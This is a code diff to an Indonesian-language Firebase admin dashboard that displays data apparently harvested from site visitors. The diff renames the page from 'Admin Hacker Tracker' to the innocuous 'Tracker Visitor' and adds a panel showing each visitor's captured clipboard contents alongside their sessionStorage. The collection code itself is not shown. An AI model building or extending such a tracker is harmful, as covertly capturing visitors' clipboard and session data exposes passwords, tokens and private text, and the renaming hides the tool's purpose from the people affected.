@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Admin Hacker Tracker</title>
+  <title>Tracker Visitor</title>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
@@ -134,6 +134,12 @@
             <div style="margin-bottom: 10px;">
               <strong>💾 SessionStorage:</strong><br>
               <div style="white-space: pre-wrap;">${data.sessionStorage}</div>
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>📋 Clipboard:</strong><br>
+              <div style="white-space: pre-wrap; color: #00FFAA;">
+                ${data.clipboard ? data.clipboard : '(Tidak tersedia atau tidak diizinkan)'}
+              </div>
             </div>
           `;
           btn.insertAdjacentElement('afterend', card);
